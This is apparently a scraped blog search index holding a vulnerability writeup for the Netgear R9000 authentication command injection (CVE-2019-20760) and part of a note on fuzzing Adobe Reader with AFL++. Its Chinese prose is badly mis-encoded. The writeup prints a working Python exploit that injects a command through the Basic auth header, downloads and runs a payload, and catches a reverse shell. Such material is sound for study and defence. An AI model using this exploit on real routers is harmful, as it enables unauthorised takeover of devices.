Router","date":"2022-11-16","objectID":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/","tags":["Netgear","IoT"],"title":"CVE-2019-20760 Netgear R9000 Authentication Bypass Vuln","uri":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/"},{"categories":["IoT"],"content":"Netgear Routeræ¼æ´åˆ†æç¬¬ä¸€ç¯‡ï¼Œå…ˆæ¥ä¸ªè€ç‚¹çš„ç®€å•æ´ä¸Šä¸Šæ‰‹ã€‚ CVE-2019-20760 Netgear R9000 Authentication Bypass ","date":"2022-11-16","objectID":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/:0:0","tags":["Netgear","IoT"],"title":"CVE-2019-20760 Netgear R9000 Authentication Bypass Vuln","uri":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/"},{"categories":["IoT"],"content":"ä¸€ã€æ¼æ´ä¿¡æ¯æœé›† ","date":"2022-11-16","objectID":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/:1:0","tags":["Netgear","IoT"],"title":"CVE-2019-20760 Netgear R9000 Authentication Bypass Vuln","uri":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/"},{"categories":["IoT"],"content":"1. æ¼æ´ç®€è¿° æ¼æ´åç§°ï¼šAuthentication Bypass on R9000,PSV-2018-0615 of NETGEAR æ¼æ´ç¼–å·ï¼šCVE-2019-20760 æ¼æ´ç±»å‹ï¼šCommand Injection æ¼æ´å½±å“ï¼šCode Execution CVSS 3.0è¯„åˆ†ï¼š8.3 åˆ©ç”¨éš¾åº¦ï¼šä½ ç”¨æˆ·æƒé™ï¼šä¸éœ€è¦ ","date":"2022-11-16","objectID":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/:1:1","tags":["Netgear","IoT"],"title":"CVE-2019-20760 Netgear R9000 Authentication Bypass Vuln","uri":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/"},{"categories":["IoT"],"content":"2. ç»„ä»¶æ¦‚è¿° NETGEAR R9000è·¯ç”±å™¨ï¼Œä¹Ÿç§°ä¸ºNithtawk X10 AD7200 Smart WiFi Routerï¼Œåœ¨å…¨çƒèŒƒå›´å†…ä½¿ç”¨æ•°é‡è¾ƒå¤§ï¼Œå±äºå®¶ç”¨è·¯ç”±å™¨å‚å•†ä¸­çš„è€å“ç‰Œã€‚ ","date":"2022-11-16","objectID":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/:1:2","tags":["Netgear","IoT"],"title":"CVE-2019-20760 Netgear R9000 Authentication Bypass Vuln","uri":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/"},{"categories":["IoT"],"content":"3. æ¼æ´åˆ©ç”¨ è¯¥æ¼æ´ä½äºè·¯ç”±å™¨çš„è®¤è¯éƒ¨åˆ†ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„è®¤è¯ç™»å½•è¯·æ±‚æ¥è§¦å‘æ¼æ´ï¼ŒæˆåŠŸè§¦å‘è¯¥æ¼æ´åå¯ä»¥å®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚ ","date":"2022-11-16","objectID":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/:1:3","tags":["Netgear","IoT"],"title":"CVE-2019-20760 Netgear R9000 Authentication Bypass Vuln","uri":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/"},{"categories":["IoT"],"content":"4. æ¼æ´å½±å“ å®˜æ–¹å…¬å¸ƒå—å½±å“äº§å“ï¼šNETGEAR R9000 ï¼Œä½¿ç”¨å›ºä»¶ä¸º1.0.4.26åŠä¹‹å‰ç‰ˆæœ¬ å®æµ‹å…¶ä»–å—å½±å“äº§å“ï¼šNETGEAR R7800ï¼Œä½¿ç”¨å›ºä»¶ä¸º1.0.2.62åŠä¹‹å‰ç‰ˆæœ¬ï¼›NETGEAR R7500ï¼Œä½¿ç”¨å›ºä»¶ä¸º1.0.3.46åŠä¹‹å‰ç‰ˆæœ¬ ï¼ˆå¤‡æ³¨ï¼šåŸºäºæ¼æ´æˆå› çŒœæµ‹å…¶ä»–äº§å“çš„éƒ¨åˆ†å›ºä»¶ç‰ˆæœ¬ä¸­ä¹Ÿä¼šå­˜åœ¨è¯¥æ¼æ´ã€‚ï¼‰ ","date":"2022-11-16","objectID":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/:1:4","tags":["Netgear","IoT"],"title":"CVE-2019-20760 Netgear R9000 Authentication Bypass Vuln","uri":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/"},{"categories":["IoT"],"content":"äºŒã€æ¼æ´å¤ç° ","date":"2022-11-16","objectID":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/:2:0","tags":["Netgear","IoT"],"title":"CVE-2019-20760 Netgear R9000 Authentication Bypass Vuln","uri":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/"},{"categories":["IoT"],"content":"1. ç¯å¢ƒæ­å»º 1. åˆ›å»ºubuntuç½‘ç»œç¯å¢ƒ # sudo apt-get install bridge-utils v4ler1an qemu_images âœ sudo brctl addbr br0 v4ler1an qemu_images âœ sudo ifconfig br0 192.168.7.1/24 up # åˆ›å»ºtapæ¥å£ï¼Œåå­—ä¸ºtap0ï¼Œå¹¶æ·»åŠ åˆ°ç½‘æ¡¥ v4ler1an qemu_images âœ sudo tunctl -t tap0 Set 'tap0' persistent and owned by uid 0 v4ler1an qemu_images âœ sudo ifconfig tap0 192.168.7.8/24 up v4ler1an qemu_images âœ sudo brctl addif br0 tap0 2. qemuç³»ç»Ÿæ¨¡å¼æ¨¡æ‹Ÿ é¦–å…ˆä¸‹è½½å›ºä»¶ï¼š æ¼æ´ç‰ˆæœ¬å›ºä»¶ä¸‹è½½é“¾æ¥ ä¿®å¤ç‰ˆæœ¬å›ºä»¶ä¸‹è½½é“¾æ¥ ç„¶åå¯¹å›ºä»¶è¿›è¡Œè§£å‹è·å–æ–‡ä»¶ç³»ç»Ÿï¼š v4ler1an R9000-V1.0.4.26 âœ binwalk R9000-V1.0.4.26.img DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 132 0x84 uImage header, header size: 64 bytes, header CRC: 0x9014DEF8, created: 2018-12-11 20:26:02, image size: 4644224 bytes, Data Address: 0x8000, Entry Point: 0x8000, data CRC: 0xADE21CB5, OS: Linux, CPU: ARM, image type: OS Kernel Image, compression type: none, image name: \"Linux-3.10.20-al-5.0-ga_na\" 196 0xC4 Linux kernel ARM boot executable zImage (little-endian) 17204 0x4334 gzip compressed data, maximum compression, from Unix, last modified: 1970-01-01 00:00:00 (null date) 4718656 0x480040 uImage header, header size: 64 bytes, header CRC: 0x1C03C2A4, created: 2018-12-11 20:26:23, image size: 31033344 bytes, Data Address: 0x40908000, Entry Point: 0x40908000, data CRC: 0x3DA0E540, OS: Linux, CPU: ARM, image type: OS Kernel Image, compression type: lzma, image name: \"Linux-3.10.20\" 4718720 0x480080 Squashfs filesystem, little endian, version 4.0, compression:xz, size: 31033290 bytes, 3642 inodes, blocksize: 262144 bytes, created: 2018-12-11 20:26:22 binwalkå¯ä»¥æ­£å¸¸è¯†åˆ«å‡ºå†…æ ¸å’Œæ–‡ä»¶ç³»ç»Ÿï¼Œæ‰€ä»¥ç›´æ¥ä½¿ç”¨binwalkè¿›è¡Œæ–‡ä»¶ç³»ç»Ÿçš„æå–ï¼š v4ler1an R9000-V1.0.4.26 âœ binwalk -Me R9000-V1.0.4.28.img æå–å‡ºæ–‡ä»¶ç³»ç»Ÿåï¼Œç¡®è®¤ä¸€ä¸‹æŒ‡ä»¤æ¶æ„ï¼š v4ler1an squashfs-root âœ file ./bin/busybox ./bin/busybox: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, no section header ä½¿ç”¨qemuçš„ç³»ç»Ÿæ¨¡å¼æ¥æ¨¡æ‹Ÿç¯å¢ƒï¼š sudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append \"root=/dev/mmcblk0p2 console=ttyAMA0\" -net nic -net tap,ifname=tap0,script=no,downscript=n0 -nographic # è¿™é‡Œå¦‚æœé‡åˆ° â€œIncalid SD card size: xxxGBâ€çš„é—®é¢˜ï¼Œåˆ™æ‰§è¡Œä»¥ä¸‹å‘½ä»¤è§£å†³ # qemu-img resize \u003cimage-file\u003e xxG (ä¸€ä¸ªç¦»çœŸå®æ–‡ä»¶å¤§å°æœ€è¿‘çš„2çš„æ•´æ•°æ¬¡fangçš„æ•°å€¼) # æœ¬ä¾‹ä¸­æ˜¯ qemu-img resize debian_wheezy_armhf_standard.qcow2 32G ç„¶åé…ç½®ä¸€ä¸‹ç½‘ç»œï¼š # åœ¨qemuè™šæ‹Ÿæœºdebianå†…éƒ¨æ‰§è¡Œ root@debian-mips:~# ifconfig eth0 192.168.7.7/24 up root@debian-mips:~# ping 192.168.7.1 # å°†æ–‡ä»¶ç³»ç»Ÿscpåˆ°debianä¸­ v4ler1an _R9000-V1.0.4.26.img.extracted âœ scp -oHostKeyAlgorithms=+ssh-dss -r squashfs-root root@192.168.7.7:~/ # æŒ‚è½½devå’Œproc root@debian-mips:~# mount -o bind /dev ./squashfs-root/dev root@debian-mips:~# mount -t proc /proc ./squashfs-root/proc # å¯åŠ¨shell root@debian-mips:~# chroot squashfs-root sh 3. webæœåŠ¡ è¿™é‡Œè¿˜éœ€è¦ç¡®è®¤çš„æ˜¯è·¯ç”±å™¨çš„webæœåŠ¡æ˜¯å¦‚ä½•å¯åŠ¨çš„ã€‚ é¦–å…ˆé€šè¿‡Refereræ¥ç­›é€‰ä¸€ä¸‹å¯èƒ½çš„webå¤„ç†ç¨‹åºï¼š v4ler1an squashfs-root âœ grep -r \"Referer\" . grep: ./usr/sbin/uhttpd: binary file matches grep: ./usr/sbin/wget: binary file matches grep: ./usr/lib/libcurl.so.4.3.0: binary file matches grep: ./usr/bin/curl: binary file matches grep: ./iQoS/R9000/TM/data_colld: binary file matches grep: ./iQoS/R8900/TM/data_colld: binary file matches grep: ./bin/fbwifi: binary file matches grep: ./bin/ookla: binary file matches é€šè¿‡ç»“æœæ¥çœ‹ï¼Œæ¨æµ‹ä¸€ä¸‹å¯èƒ½æ˜¯uhttpdã€‚æŸ¥çœ‹/etc/init.dä¸‹çš„å„ä¸ªè„šæœ¬ï¼š v4ler1an init.d âœ ls acl dni-debug.init lltd qcmbr ubus atd dni-qos net-br rcS uhttpd avahi-daemon dnsmasq net-br-dhcpc-helper repacd umount aws done net-lan ripngd upnp bond-init enet net-scan run_afpd usb boot forked-daapd net-wan samba watchdog ca-certificates glboot ntpclient ssid_steering wigig_linkloss_wd check_eeprom igmpproxy.init openvpn sysctl wlan-common cron init6 openvpn_check syslogd zebra dbus iqos opmode sysstat zzprefix-check_cert_files ddns kcode pot telnet detcable lbd powerctl traffic_meter æŸ¥çœ‹uhttpdï¼š v4ler1an init.d âœ cat uhttpd #!/bin/sh /etc/rc.common ... ... start() { #config_load uhttpd #config_foreach start_instance uhttpd #mkdir /tmp/www #cp -rf /usr/www","date":"2022-11-16","objectID":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/:2:1","tags":["Netgear","IoT"],"title":"CVE-2019-20760 Netgear R9000 Authentication Bypass Vuln","uri":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/"},{"categories":["IoT"],"content":"2. å¤ç°è¿‡ç¨‹ ä½¿ç”¨admin/adminçš„è´¦å·å¯†ç ç™»å½•ï¼ŒæŠ“åŒ…å¦‚ä¸‹ï¼š GET /cgi-bin/ HTTP/1.1 Host: 192.168.7.7 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux aarch64; rv:106.0) Gecko/20100101 Firefox/106.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Authorization: Basic YWRtaW46YWRtaW4= å¯¹äºå¸¸è§„å­—æ®µæ²¡æœ‰å‘ç°ç‰¹æ®Šçš„æƒ…å†µï¼Œå¯¹äºAuthorizationå­—æ®µï¼Œæœ‰ä¸€æ®µBase64åŠ å¯†çš„å†…å®¹ï¼Œä½¿ç”¨Base64è§£å¯†åå‘ç°æ˜¯admin:adminï¼Œä¹Ÿå°±æ˜¯ç”¨æˆ·åå’Œå¯†ç ã€‚æ„é€ payloadå¦‚ä¸‹ï¼š echo \"admin:`touch /aaa`\" | base64 YWRtaW46YHRvdWNoIC9hYWFg æ„é€ å¦‚ä¸‹æ•°æ®åŒ…ï¼š GET /cgi-bin/ HTTP/1.1 Host: 192.168.7.7 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux aarch64; rv:106.0) Gecko/20100101 Firefox/106.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Authorization: Basic YWRtaW46YHRvdWNoIC9hYWFg æ•°æ®åŒ…å‘é€åï¼Œåœ¨æ–‡ä»¶ç³»ç»Ÿä¸­æ–°å¢äº†ä¸€ä¸ªaaaæ–‡ä»¶ï¼š root@debian-armhf:~/squashfs-root# ls aaa etc hw_id proc tmp bin firmware_region iQoS rom usr cloud_version firmware_time lib root www default_language_version firmware_version module_name sbin dev hardware_version overlay sys ","date":"2022-11-16","objectID":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/:2:2","tags":["Netgear","IoT"],"title":"CVE-2019-20760 Netgear R9000 Authentication Bypass Vuln","uri":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/"},{"categories":["IoT"],"content":"ä¸‰ã€æ¼æ´åˆ†æ ç›´æ¥ä½¿ç”¨IDAåç¼–è¯‘uhttpdç¨‹åºï¼Œç„¶åæ ¹æ®å­—ç¬¦ä¸²Authorizationå¯ä»¥å®šä½åˆ°uh_cgi_auth_checkå‡½æ•°ï¼š å…¶å®å‡½æ•°é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œæ•°æ®åŒ…å¤´éƒ¨çš„Authorizationä¸­çš„Basicåçš„æ•°æ®ç»è¿‡Base64è§£ç åï¼Œ:åé¢çš„å†…å®¹ä¼šä¼ é€’ç»™snprintfï¼Œè¿™éƒ¨åˆ†å†…å®¹ä¹Ÿå°±æ˜¯passwordéƒ¨åˆ†ï¼Œç„¶åå°±ç›´æ¥è°ƒç”¨systemå‡½æ•°æ¥æ‰§è¡Œäº†ã€‚æ¼æ´çš„æˆå› å¯ä»¥è¯´éå¸¸ç®€å•äº†ï¼Œç”šè‡³éƒ½æ²¡æœ‰åŠ¨æ€è°ƒè¯•çš„å¿…è¦ã€‚ ï¼ˆæ‚è°ˆï¼šå®˜æ–¹ç»™å‡ºçš„æ¼æ´å½±å“æ˜¯è®¤è¯ç»•è¿‡ï¼Œä½†æ˜¯åˆ†æä¸‹æ¥çœ‹ï¼Œè¿™æ˜¯è®¤è¯å‰å‘½ä»¤æ³¨å…¥ï¼Œå¹¶ä¸”å¯ä»¥å®ç°RCEï¼Œä¸¥é‡ç¨‹åº¦è¿œæ¯”å®˜æ–¹ç»™å‡ºçš„æè¿°å¤§ã€‚Fineï¼Œå¼€å¿ƒå°±å¥½ã€‚ï¼‰ æ‰€ä»¥è¿™é‡Œå¯ä»¥ç›´æ¥ç»™å‡ºexpï¼š #!/usr/bin/python3 from pwn import * from threading import Thread import requests import base64 cmd = 'admin:' cmd += '`' cmd += 'wget http://192.168.7.1:8000/tools/msf -O /msf\\n' cmd += 'chmod 777 /msf\\n' cmd += '/msf' cmd += '`' assert(len(cmd) \u003c 255) cmd_b64 = base64.b64encode(cmd.encode()).decode() headers = { \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Encoding\": \"gzip, deflate\", \"Connection\": \"keep-alive\", \"Upgrade-Insecure-Requests\": \"1\", \"Authorization\": \"Basic \" + cmd_b64 } def attack(): try: requests.get(\"http://192.168.7.7/cgi-bin/\", headers=headers, timeout=1) except Exception as e: print(e) thread = Thread(target=attack) thread.start() io = listen(31337) io.wait_for_connection() log.success(\"getshell\") io.interactive() thread.join() é‡‡ç”¨çš„æ˜¯IoT-vulhubç»™å‡ºçš„expæ–¹æ¡ˆï¼Œä½¿ç”¨äº†msfçš„payloadæ¥å®ç°åå¼¹shellã€‚ ","date":"2022-11-16","objectID":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/:3:0","tags":["Netgear","IoT"],"title":"CVE-2019-20760 Netgear R9000 Authentication Bypass Vuln","uri":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/"},{"categories":["IoT"],"content":"å››ã€æ¼æ´æŒ–æ˜æ€è·¯ çŒœæµ‹ä¸€ä¸‹æ¼æ´çš„å‘ç°è€…ç¬¬ä¸€çœ¼åº”è¯¥æ˜¯æŠ“å–ç™»å½•åŒ…çœ‹åˆ°äº†Authorizationå­—æ®µçš„Base64ç¼–ç çš„å†…å®¹ï¼Œç„¶åæ¥é€†å‘uhttpdç¨‹åºï¼Œå®šä½åˆ°uh_cgi_auth_checkå‡½æ•°ååº”è¯¥å¾ˆå¿«å°±å‘ç°äº†è¿™ä¸ªæ¼æ´ã€‚ ","date":"2022-11-16","objectID":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/:4:0","tags":["Netgear","IoT"],"title":"CVE-2019-20760 Netgear R9000 Authentication Bypass Vuln","uri":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/"},{"categories":["IoT"],"content":"äº”ã€é˜²å¾¡æªæ–½ é¦–å…ˆæ¥çœ‹ä¸‹æ¼æ´ä¿®å¤ç‰ˆæœ¬1.0.2.48ç‰ˆæœ¬çš„uh_cgi_auth_checkå‡½æ•°ï¼š å¯ä»¥çœ‹åˆ°ä¿®å¤ç‰ˆæœ¬ä¸å†é‡‡ç”¨snprintf-systemæ¨¡å¼çš„æ‰§è¡Œå‘½ä»¤æ–¹å¼ï¼ŒäºŒæ˜¯é‡‡ç”¨äº†dni_systemå‡½æ•°ï¼š è¯¥å‡½æ•°æœ€åæ˜¯è°ƒç”¨execveçš„æ–¹å¼æ¥å®ç°å‘½ä»¤æ‰§è¡Œï¼Œåªæœ‰å‚æ•°å¯æ§ï¼Œæ— æ³•å†åšåˆ°RCEã€‚ ","date":"2022-11-16","objectID":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/:5:0","tags":["Netgear","IoT"],"title":"CVE-2019-20760 Netgear R9000 Authentication Bypass Vuln","uri":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/"},{"categories":["IoT"],"content":"å…­ã€å‚è€ƒé“¾æ¥ https://xz.aliyun.com/t/9125 ","date":"2022-11-16","objectID":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/:6:0","tags":["Netgear","IoT"],"title":"CVE-2019-20760 Netgear R9000 Authentication Bypass Vuln","uri":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/"},{"categories":["Fuzz"],"content":"Fuzzing 101 ç³»åˆ— note 8","date":"2022-01-16","objectID":"/2022/01/fuzzing101-8/","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 8","uri":"/2022/01/fuzzing101-8/"},{"categories":["Fuzz"],"content":"æœ¬æ–‡æ˜¯Fuzzing101ç³»åˆ—ç¬¬å…«ç¯‡ï¼Œfuzzçš„å¯¹è±¡ä¸º Adobe Reader ã€‚ ","date":"2022-01-16","objectID":"/2022/01/fuzzing101-8/:0:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 8","uri":"/2022/01/fuzzing101-8/"},{"categories":["Fuzz"],"content":"1. Basic Info ä¸€ä¸ª OOB read vulneratibily. ","date":"2022-01-16","objectID":"/2022/01/fuzzing101-8/:1:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 8","uri":"/2022/01/fuzzing101-8/"},{"categories":["Fuzz"],"content":"2. Learning Target ä½¿ç”¨ AFL++ çš„ QEMU æ¨¡å¼æ¥å¯¹é—­æºè½¯ä»¶è¿›è¡Œ fuzz åœ¨ QEMU æ¨¡å¼ä¸‹å¼€å¯ persistent mode ç»ƒä¹ å¦‚ä½•ä½¿ç”¨ QASAN ï¼Œä¸€ä¸ªäºŒè¿›åˆ¶å±‚é¢çš„ sanitizer ","date":"2022-01-16","objectID":"/2022/01/fuzzing101-8/:2:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 8","uri":"/2022/01/fuzzing101-8/"},{"categories":["Fuzz"],"content":"3. Fuzzing ","date":"2022-01-16","objectID":"/2022/01/fuzzing101-8/:3:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 8","uri":"/2022/01/fuzzing101-8/"},{"categories":["Fuzz"],"content":"1. Workflow å®‰è£… AFL++ çš„ QEMU åˆ›å»ºä¸€ä¸ª PDF çš„è¯­æ–™åº“ å¼€å¯ persistent mode ä½¿ç”¨ QEMU æ¨¡å¼å¯¹ Adobe Reader è¿›è¡Œ fuzzï¼Œç›´åˆ°å‡ºç°crash ä½¿ç”¨é€ æˆcrashçš„pocé‡ç°crash ä¿®å¤æ¼æ´ ","date":"2022-01-16","objectID":"/2022/01/fuzzing101-8/:3:1","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 8","uri":"/2022/01/fuzzing101-8/"},{"categories":["Fuzz"],"content":"2. Solution 1. Download and build target é¦–å…ˆå®‰è£… AFL++ çš„ QEMU æ¨¡å¼ï¼Œä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æ¥è¿›è¡Œæ£€æµ‹æ˜¯å¦å®‰è£…ï¼š afl-qemu-trace --help è¿™ç§æ˜¾ç¤ºè¡¨æ˜å·²ç»å®‰è£…æˆåŠŸäº†ã€‚å¦‚æœä¸èƒ½ï¼Œåˆ™éœ€è¦é¢å¤–å®‰è£…ï¼š sudo apt install ninja-build libc6-dev-i386 cd ~/Desktop/v4ler1an/AFLplusplus/qemu_mode/ CPU_TARGET=i386 ./build_qemu_support.sh make distrib sudo make install ç„¶åå®‰è£… Adobe Reader ï¼š # install dependencies sudo apt-get install libxml2:i386 # download and uncompress wget ftp://ftp.adobe.com/pub/adobe/reader/unix/9.x/9.5.1/enu/AdbeRdr9.5.1-1_i386linux_enu.deb # install sudo dpkg -i AdbeRdr9.5.1-1_i386linux_enu.deb å®‰è£…å®Œæˆåï¼Œæ£€æµ‹æ˜¯å¦æˆåŠŸï¼š /opt/Adobe/Reader9/bin/acroread å®‰è£…æˆåŠŸåä¼šå‡ºç°å¦‚ä¸‹ä¿¡æ¯ï¼š 2. Seed corpus creation ä» SafeDocs â€œIssue Trackerâ€ ä¸‹è½½è¯­æ–™ï¼Œæˆ–è€…ä»è¿™é‡Œä½¿ç”¨æ›´å¤šçš„ PDF è¯­æ–™ã€‚ # download and uncompress wget https://corpora.tika.apache.org/base/packaged/pdfs/archive/pdfs_202002/libre_office.zip unzip libre_office.zip -d extracted è¿™é‡Œå› ä¸º PDF æ ¼å¼çš„æ–‡ä»¶ä¸€èˆ¬ä¼šæ¯”è¾ƒå¤§ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆç­›é€‰å°äº 2KB çš„æ–‡ä»¶æ¥åŠ å¿« fuzz é€Ÿåº¦ï¼š mkdir -p $HOME/Desktop/Fuzz/training/fuzzing_adobereader/afl_in find ./extracted -type f -size -2k \\ -exec cp {} $HOME/Desktop/Fuzz/training/fuzzing_adobereader/afl_in \\; 3. Fuzzing è¿™é‡Œåœ¨æ‰§è¡Œ fuzz æ—¶ï¼Œæœ‰ä¸¤ç§æ–¹å¼ï¼š ç¬¬ä¸€ç§æ˜¯ç›´æ¥ä½¿ç”¨ -Q é€‰é¡¹å¼€å¯ QEMU modeã€‚ è¿™é‡Œæœ‰ä¸€ä¸ªéœ€è¦æ³¨æ„çš„é—®é¢˜ï¼Œå› ä¸ºå‰é¢è¿è¡Œçš„ /opt/Adobe/Reader9/bin/acroread æ˜¯ä¸€ä¸ª shell è„šæœ¬ï¼Œå¹¶ä¸æ˜¯å®é™…çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚çœŸæ­£çš„äºŒè¿›åˆ¶æ–‡ä»¶æ˜¯ /opt/Adobe/Reader9/Reader/intellinux/bin/acroreadã€‚è¿™é‡Œéœ€è¦è®¾ç½®ä¸€ä¸‹ä¸¤ä¸ªç¯å¢ƒå˜é‡ï¼šACRO_INSTALL_DIR å’Œ ACRO_CONFIGã€‚ç„¶åï¼Œ é€šè¿‡ LD_LIBRARY_PATH æŒ‡å®šåŠ è½½å…±äº«åº“çš„è·¯å¾„ã€‚æ‰€ä»¥æœ€ç»ˆæ‰§è¡Œçš„ fuzz å‘½ä»¤å¦‚ä¸‹ï¼š ACRO_INSTALL_DIR=/opt/Adobe/Reader9/Reader ACRO_CONFIG=intellinux LD_LIBRARY_PATH=$LD_LIBRARY_PATH:'/opt/Adobe/Reader9/Reader/intellinux/lib' afl-fuzz -Q -i ./afl_in/ -o ./afl_out/ -t 2000 -- /opt/Adobe/Reader9/Reader/intellinux/bin/acroread -toPostScript @@ ä½†æ˜¯è¿™ç§æ–¹å¼å¾ˆæ…¢ï¼Œæˆ‘ä»¬éœ€è¦æƒ³åŠæ³•æå‡ fuzz é€Ÿåº¦ã€‚ ç¬¬äºŒç§å°±æ˜¯ä½¿ç”¨ AFL çš„ persistent æ¨¡å¼ã€‚è¿™ç§æ¨¡å¼å¯ä»¥ç”¨åœ¨æœ‰æºç çš„æƒ…å†µä¸‹ï¼Œä¹Ÿå¯ä»¥ç”¨åœ¨åªæœ‰äºŒè¿›åˆ¶æ–‡ä»¶çš„æƒ…å†µä¸‹ã€‚åœ¨æœ‰æºç æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨æºç çš„åˆé€‚çš„ä½ç½®æ’å…¥å¦‚ä¸‹ä»£ç æ¥å®ç° persistent æ¨¡å¼ï¼š while(__AFL_LOOP(10000)){ /* Read input data. */ /* Call library code to be fuzzed. */ /* Reset state. */ } å¯¹äº persistent æ¨¡å¼çš„è¯¦ç»†ä»‹ç»å¯ä»¥é˜…è¯»è¿™é‡Œã€‚ è€Œå¯¹äºåªæœ‰äºŒè¿›åˆ¶æ–‡ä»¶çš„æƒ…å†µï¼Œæ•´ä½“æ€è·¯ä¸Šæ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿæ˜¯æ‰¾åˆ°åˆé€‚çš„ä½ç½®è®¾ç½®å¾ªç¯ã€‚åˆ†æäºŒè¿›åˆ¶æ–‡ä»¶çš„å‡½æ•°åœ°å€å¯ä»¥ä½¿ç”¨å¸¸è§„çš„ IDA ç­‰å·¥å…·è¿›è¡Œåç¼–è¯‘æ¥è·å–ï¼Œè¿™é‡Œä½¿ç”¨ä¸€ç§ç®€å•çš„å·¥å…· â€”â€” valgrindã€‚æˆ‘ä»¬ä½¿ç”¨å…¶ä¸­çš„ callgrind æ¥åˆ†æç¨‹åºè¿è¡Œçš„æ—¶é—´å’Œè°ƒç”¨è¿‡ç¨‹ï¼Œæ¥åˆ¤æ–­åˆé€‚çš„ä½ç½®ï¼š sudo apt-get install valgrind sudo apt-get install kcachegrind ç„¶åï¼Œä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æ¥ç”Ÿæˆä¸€ä¸ª callgrind reportï¼š ACRO_INSTALL_DIR=/opt/Adobe/Reader9/Reader ACRO_CONFIG=intellinux LD_LIBRARY_PATH=/opt/Adobe/Reader9/Reader/intellinux/lib valgrind --tool=callgrind /opt/Adobe/Reader9/Reader/intellinux/bin/acroread -toPostScript [samplePDF] ä¸Šè¿°å‘½ä»¤ä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ª callgrind.out æ–‡ä»¶ï¼Œç„¶åä½¿ç”¨ kcachegrind æ¥è¯»å–ï¼š kcachegrind è¯»å–å‡ºçš„ä¿¡æ¯å¦‚ä¸‹ï¼š è¿™é‡Œæˆ‘ä»¬é€‰æ‹©åœ°å€ 0x08546a00 ã€‚é€‰æ‹©çš„åŸåˆ™æ˜¯å°½å¯èƒ½é€‰æ‹©é‚£äº›åªæ‰§è¡Œäº†ä¸€æ¬¡ï¼Œå¹¶ä¸”å¯ä»¥ä½¿å¾— AFL++ çš„ stability å€¼èƒ½åœ¨ 90% ä»¥ä¸Šçš„åœ°å€ã€‚æ‰€ä»¥ä½¿ç”¨çš„å‘½ä»¤ä¸ºï¼š AFL_QEMU_PERSISTENT_ADDR=0x08546a00 ACRO_INSTALL_DIR=/opt/Adobe/Reader9/Reader ACRO_CONFIG=intellinux LD_LIBRARY_PATH=$LD_LIBRARY_PATH:'/opt/Adobe/Reader9/Reader/intellinux/lib' afl-fuzz -Q -i ./afl_in/ -o ./afl_out/ -t 2000 -- /opt/Adobe/Reader9/Reader/intellinux/bin/acroread -toPostScript @@ æˆ‘ä»¬æŒ‡å®šäº†å˜é‡ AFL_QEMU_PERSISTENT_ADDR ä¸ºä¸Šé¢é€‰æ‹©çš„åœ°å€ã€‚è¿™æ¬¡çš„fuzzé€Ÿåº¦ä¼šæœ‰æå‡ï¼š 